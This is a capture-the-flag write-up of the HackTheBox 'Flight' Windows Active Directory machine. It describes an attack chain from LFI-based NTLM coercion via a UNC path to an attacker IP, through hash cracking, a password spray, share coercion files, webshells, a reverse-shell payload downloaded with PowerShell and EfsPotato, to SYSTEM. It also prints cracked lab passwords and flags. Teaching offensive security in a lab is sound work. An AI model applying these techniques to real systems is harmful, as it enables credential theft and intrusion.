---
title: "HTB: Flight"
date: 2026-06-04
draft: false
tags:
  - htb
  - windows
  - hard
  - write-up
  - active-directory
  - web
  - smb
  - apache
  - lfi
  - rfi
  - password-spray
  - credential-reuse
  - responder
  - nmap
  - gobuster
  - msfconsole
  - meterpreter
  - runascs
  - iis
description: "Flight is a Hard Windows Active Directory box from HackTheBox. An LFI on a PHP school subdomain escalates to NTLM hash capture via UNC path. Crack svc_apache's hash, password spray to S.Moon, use ntlm_theft via the Shared share to coerce C.Bum's hash, pivot through a PHP webshell to meterpreter, RunasCs to C.Bum, discover an internal IIS dev site, upload an ASPX webshell, and escalate to SYSTEM via SeImpersonatePrivilege and EfsPotato."
ShowToc: true
cover:
  image: "/images/htb-flight/cover.png"
  alt: "HTB Flight machine avatar"
---

Machine #73 on the Lain Kusanagi list. Flight earns its Hard rating not through any single clever trick, but through sheer chain length - each hop unlocks exactly one new thing, and you have to string six or seven of them together to reach SYSTEM. It's a patience test as much as a technical one.

## Machine Info

| | |
|---|---|
| **Name** | Flight |
| **Platform** | HackTheBox |
| **OS** | Windows |
| **Difficulty** | Hard |
| **IP** | 10.129.7.136 |
| **Domain** | flight.htb |

## TL;DR

Nmap shows a full AD port set. Gobuster vhost finds `school.flight.htb`, a PHP app with a `?view=` parameter vulnerable to LFI. UNC path inclusion leaks svc_apache's NTLMv2 hash via Responder - john cracks it to `S@Ss!K@*t13`. Password spray finds S.Moon reuses the same password. S.Moon has WRITE on the Shared share - use ntlm_theft to drop a `desktop.ini` coercion file, Responder captures C.Bum's hash, john cracks it to `Tikkycoll_431012284`. C.Bum has WRITE on the Web share - upload a PHP webshell, get a reverse shell as `svc_apache`. Generate a msfvenom payload, catch it in msfconsole, upload RunasCs via meterpreter, run as C.Bum to get a second session. Port-forward port 8000 (internal IIS dev site) through the C.Bum session, discover `C:\inetpub\development` is writable, upload an ASPX webshell, get a shell as `IIS AppPool\DefaultAppPool`. That account has SeImpersonatePrivilege - msfconsole `getsystem` uses Named Pipe Impersonation (EfsPotato variant) to land NT AUTHORITY\SYSTEM.

## Recon

{{< figure src="/images/htb-flight/nmap-scan.png" alt="nmap scan showing ports 53 80 88 135 139 389 445 464 593 636 3268 3269 5985 9389 open on 10.129.7.136" >}}

The nmap output tells the story immediately: DNS, HTTP, Kerberos, RPC, SMB, LDAP, WinRM, ADWS. Full DC profile, and port 80 means there's a web server running - not common on a DC, so that's where attention goes first.

## Enumeration

### Vhost Discovery

```bash
gobuster vhost -u http://flight.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

{{< figure src="/images/htb-flight/gobuster-vhost.png" alt="gobuster vhost enumeration finding school.flight.htb returning HTTP 200 with size 3996" >}}

`school.flight.htb` returns 200. Add it to `/etc/hosts` and navigate:

{{< figure src="/images/htb-flight/school-flight-view-param.png" alt="browser showing school.flight.htb/index.php?view=home.html with a PHP view parameter in the URL" >}}

The `?view=home.html` parameter is immediately suspicious - a PHP app loading file contents from a user-controlled path. Classic LFI setup.

### LFI Confirmation with wfuzz

{{< figure src="/images/htb-flight/wfuzz-lfi.png" alt="wfuzz LFI scan on school.flight.htb view parameter showing reads of php.ini httpd.conf system32 drivers etc files and xampp access.log" >}}

The `view` parameter reads files raw. PHP system files, Apache config, Windows `system32\drivers\etc` files, and `c:/xampp/apache/logs/access.log` (47k lines). No filtering at all.

**Log poisoning attempt**: Since `access.log` is readable and it's Apache/PHP, the natural move is to poison the log with PHP code in a User-Agent and then include the log to get RCE. Tried it - the code showed up in the log but didn't execute. The app is using `file_get_contents()` rather than `include()`, so it reads bytes but doesn't evaluate PHP tags. Dead end.

### From LFI to NTLM Hash Capture via UNC Path

The key insight on Windows: if the PHP include mechanism follows UNC paths (`\\server\share`), the web server will reach out to our SMB listener and authenticate with the service account's NTLM credentials. Not traditional RFI - just NTLM coercion via the UNC path primitive.

Start Responder first:

{{< figure src="/images/htb-flight/responder-start.png" alt="sudo responder -I tun0 -v starting the Responder NTLM capture server" >}}

Then send the payload:

{{< figure src="/images/htb-flight/rfi-unc-payload.png" alt="browser showing school.flight.htb/index.php?view=//10.10.14.2/test as the RFI UNC path payload" >}}

{{< figure src="/images/htb-flight/ntlm-hash-captured.png" alt="Responder capturing NTLMv2 hash for flight\\svc_apache with full NTLM challenge response hash string" >}}

`flight\svc_apache` authenticates back. NTLMv2 challenge/response captured - enough to crack offline.

## Foothold

### Cracking svc_apache's Hash

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

{{< figure src="/images/htb-flight/john-crack.png" alt="john cracking svc_apache NTLMv2 hash with result S@Ss!K@*t13 for svc_apache in under a minute" >}}

`svc_apache:S@Ss!K@*t13`. Under a minute with rockyou.

### Domain User Enumeration

With valid creds, enumerate the domain:

{{< figure src="/images/htb-flight/nxc-user-enum.png" alt="nxc smb enumeration with svc_apache credentials showing 15 domain users including Administrator S.Moon R.Cold G.Lors L.Kein M.Gold C.Bum W.Walker I.Francis D.Truff V.Stevens svc_apache O.Possum" >}}

15 users. Save to a file and spray - service account passwords get reused.

### Password Spray

{{< figure src="/images/htb-flight/password-spray.png" alt="nxc smb password spray with S@Ss!K@*t13 against all domain users showing S.Moon STATUS_LOGON_SUCCESS and all others failing" >}}

One hit: `S.Moon:S@Ss!K@*t13`. Everyone else fails.

### S.Moon's SMB Access

{{< figure src="/images/htb-flight/smoon-shares.png" alt="nxc smb shares for S.Moon showing Shared with READ WRITE permissions and Web with READ only" >}}

S.Moon has READ+WRITE on `Shared` and READ-only on `Web`. The write access is the pivot point.

### NTLM Coercion via ntlm_theft

Write access to a share browsed by other users is a coercion primitive. `ntlm_theft` generates a collection of files that trigger NTLM auth when opened or browsed - `.url`, `desktop.ini`, `.lnk`, and more:

{{< figure src="/images/htb-flight/ntlm-theft-generate.png" alt="ntlm_theft.py generating all coercion file types including scf url lnk rtf ini docx and others pointing to 10.10.14.2" >}}

Upload `desktop.ini` to the Shared share via smbclient:

{{< figure src="/images/htb-flight/desktop-ini-upload.png" alt="smbclient putting desktop.ini to the Shared share showing successful upload" >}}

Start Responder again and wait. When any user browses the share, their system automatically authenticates to the embedded UNC path. Within seconds:

{{< figure src="/images/htb-flight/cbum-hash-captured.png" alt="Responder capturing NTLMv2 hash for flight\\c.bum with full NTLM challenge response hash string" >}}

`flight\c.bum` bites. Crack it:

{{< figure src="/images/htb-flight/cbum-john-crack.png" alt="john cracking C.Bum NTLMv2 hash with result Tikkycoll_431012284 for c.bum" >}}

`C.Bum:Tikkycoll_431012284`.

### C.Bum's Shares

{{< figure src="/images/htb-flight/cbum-shares.png" alt="nxc smb shares for C.Bum showing Web with READ WRITE permissions" >}}

C.Bum has READ+WRITE on the `Web` share. That share maps to the `flight.htb` web root.

### PHP Webshell via C.Bum

Connect to the Web share as C.Bum and upload a PHP webshell:

{{< figure src="/images/htb-flight/webshell-upload.png" alt="smbclient uploading shell.php and cmd.php to the flight.htb web share showing successful put operations" >}}

Trigger it:

{{< figure src="/images/htb-flight/cmd-php-whoami.png" alt="browser showing flight.htb/cmd.php?cmd=whoami returning flight\\svc_apache as the executing user" >}}

RCE as `flight\svc_apache`. The PHP process runs under svc_apache, not C.Bum - that's fine, it's still a shell.

### Initial Reverse Shell

Set up a listener and use the webshell to send a PowerShell base64-encoded reverse shell:

{{< figure src="/images/htb-flight/svc-apache-revshell.png" alt="nc listener catching reverse shell from 10.129.228.120, whoami showing flight\\svc_apache at C:\\xampp\\htdocs\\flight.htb" >}}

Shell as `svc_apache` from `C:\xampp\htdocs\flight.htb`.

### Upgrading to Meterpreter

A raw nc shell is fragile. Generate a msfvenom payload to catch in msfconsole:

{{< figure src="/images/htb-flight/msfvenom-payload.png" alt="msfvenom generating windows/x64/shell_reverse_tcp payload as taskkill.exe for LHOST 10.10.14.2 LPORT 4444" >}}

Download it to the target via PowerShell `iwr`:

{{< figure src="/images/htb-flight/payload-download.png" alt="PowerShell iwr downloading taskkill.exe to C:\\xampp\\htdocs\\flight.htb, dir showing cmd.php shell.php and taskkill.exe present" >}}

Run it:

```
PS C:\xampp\htdocs\flight.htb> .\taskkill.exe
```

{{< figure src="/images/htb-flight/msfconsole-svcapache.png" alt="msfconsole multi/handler catching shell session from 10.129.228.120, Microsoft Windows 10.0.17763.2989 shell at C:\\xampp\\htdocs\\flight.htb" >}}

Meterpreter session as `svc_apache`.

### Lateral Movement to C.Bum via RunasCs

From the meterpreter session, upload RunasCs - a tool that runs processes as another user without an interactive logon:

{{< figure src="/images/htb-flight/meterpreter-upload.png" alt="meterpreter uploading RunasCs.exe and taskkill.exe to the target showing 100% upload completion" >}}

Run taskkill.exe as C.Bum using RunasCs:

{{< figure src="/images/htb-flight/runascs-cbum.png" alt="RunasCs.exe running taskkill.exe as c.bum with Tikkycoll_431012284 password, warning about limited logon type, spawning command shell session 5" >}}

The note about `--logon-type 8` and limited logon is worth paying attention to - RunasCs uses network logon by default for non-interactive scenarios, which limits token privileges. It still works here because we just need execution as C.Bum, not full interactive privileges.

{{< figure src="/images/htb-flight/msfconsole-cbum.png" alt="msfconsole sessions 5 showing whoami returns flight\\c.bum at C:\\Windows\\system32" >}}

Session as `flight\c.bum`.

{{< figure src="/images/htb-flight/user-flag.png" alt="type user.txt at C:\\Users\\C.Bum\\Desktop returning the user flag hash 64842961f30d179e1a2277e09c5015df" >}}

User flag.

## Privilege Escalation

### Discovering the Internal Development Site

From the C.Bum meterpreter session, check what's listening internally:

{{< figure src="/images/htb-flight/netstat-port8000.png" alt="meterpreter netstat showing port 8000 listening on 0.0.0.0 alongside the other standard AD ports" >}}

Port 8000 is open on localhost - likely another web application not exposed externally. Set up a port forward through the meterpreter session:

{{< figure src="/images/htb-flight/portfwd-8000.png" alt="meterpreter portfwd add -l 8000 -p 8000 -r 127.0.0.1 showing Forward TCP relay created local 8000 to remote 127.0.0.1:8000" >}}

Browse to `http://127.0.0.1:8000`:

{{< figure src="/images/htb-flight/development-site.png" alt="browser showing FLIGHT travel website at 127.0.0.1:8000 with choose your direction booking interface" >}}

A development version of the main flight.htb site, served by IIS. Check the web root:

{{< figure src="/images/htb-flight/inetpub-development.png" alt="dir listing of C:\\inetpub\\development showing contact.html css fonts img index.html js files dated 06/04/2026" >}}

`C:\inetpub\development`. C.Bum can write to a `development` subdirectory inside it - the IIS site serves from there. Upload an ASPX webshell:

{{< figure src="/images/htb-flight/aspx-upload.png" alt="PowerShell iwr downloading cmdasp.aspx to C:\\inetpub\\development\\development\\cmdasp.aspx" >}}

{{< figure src="/images/htb-flight/aspx-webshell.png" alt="browser showing awen asp.net webshell at 127.0.0.1:8000/development/cmdasp.aspx with command input box" >}}

ASPX webshell is live. IIS runs under `IIS AppPool\DefaultAppPool` - time to get a shell.

### Shell as IIS AppPool\DefaultAppPool

Send a reverse shell from the ASPX webshell:

{{< figure src="/images/htb-flight/iisapppool-shell.png" alt="nc listener catching reverse shell from 10.129.228.120, whoami showing iis apppool\\defaultapppool at C:\\windows\\system32\\inetsrv" >}}

`iis apppool\defaultapppool`. Download and run the msfvenom payload:

{{< figure src="/images/htb-flight/run-taskkill.png" alt="PowerShell running .\\taskkill.exe from C:\\xampp\\htdocs\\flight.htb to send a shell back to msfconsole" >}}

### SeImpersonatePrivilege - SYSTEM via EfsPotato

IIS AppPool accounts get `SeImpersonatePrivilege` by design - they need to impersonate users making HTTP requests. Check the privileges:

{{< figure src="/images/htb-flight/whoami-priv.png" alt="whoami /priv output showing SeImpersonatePrivilege as Enabled Enabled by Default along with SeCreateGlobalPrivilege" >}}

With a meterpreter session on this account, `getsystem` handles the escalation automatically:

{{< figure src="/images/htb-flight/getsystem.png" alt="meterpreter getsystem output showing got system via technique 6 Named Pipe Impersonation EFSRPC variant AKA EfsPotato, getuid returning NT AUTHORITY\\SYSTEM" >}}

Technique 6 is Named Pipe Impersonation using the EFSRPC (Encrypting File System RPC) variant - what's commonly known as EfsPotato or EfsRpc coercion. MSF picked it automatically because it's reliable on Server 2019.

{{< figure src="/images/htb-flight/root-flag.png" alt="type C:\\Users\\Administrator\\Desktop\\root.txt returning root flag d54b38e3f0fe3ad8cbc9bf24e9e15278" >}}

SYSTEM. Root flag.

### Manual Path: SharpEfsPotato

If you prefer not to use Metasploit for the privesc, [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) does the same thing as a standalone binary. Check the OS first to confirm Server 2019:

{{< figure src="/images/htb-flight/systeminfo.png" alt="systeminfo output showing OS Name Microsoft Windows Server 2019 Standard Build 17763 Primary Domain Controller VMware" >}}

{{< figure src="/images/htb-flight/sharpefspotato.png" alt="SharpEfsPotato.exe running with taskkill.exe as argument, triggering named pipe impersonation via EfsRpc, showing process created successfully" >}}

Same result - process spawns as SYSTEM.

## Takeaways

**LFI to NTLM hash via UNC paths is a Windows-specific primitive worth burning into memory.** On Linux, path traversal means file reads or code execution. On Windows with PHP, if UNC paths aren't filtered, you turn LFI into NTLM credential capture with zero code execution needed - the OS handles the authentication handshake automatically.

**ntlm_theft is the right tool for SMB share coercion.** Rather than crafting a single coercion file manually, it generates the full menu - `.url`, `desktop.ini`, `.scf`, `.lnk`, `.docx` and more. Different Windows versions and configurations are more susceptible to different file types; covering all of them maximizes capture chance.

**RunasCs bridges the gap between credential ownership and code execution.** When you have a user's password but no interactive logon path (no WinRM, no RDP, SMB share access only), RunasCs lets you spawn processes as that user over a network logon token. Understand the `--logon-type` nuance - the default works for execution, but elevated privileges need type 9 (NewCredentials) which has its own trade-offs.

**Internal port forwards via meterpreter are often the key to finding the next hop.** After getting C.Bum's session, `netstat` revealed port 8000 - a dev IIS site not exposed externally. Without the port forward, that attack surface would have been invisible. Always check what's listening internally after each new account.

**IIS AppPool accounts always have SeImpersonatePrivilege.** It's by design - IIS needs it to serve requests under different user contexts. Any time you land a shell as an IIS AppPool identity, EfsPotato/PrintSpoofer/GodPotato is the immediate next move.

## References

- [Responder](https://github.com/lgandx/Responder)
- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [HTB Flight](https://www.hackthebox.com/machines/Flight)
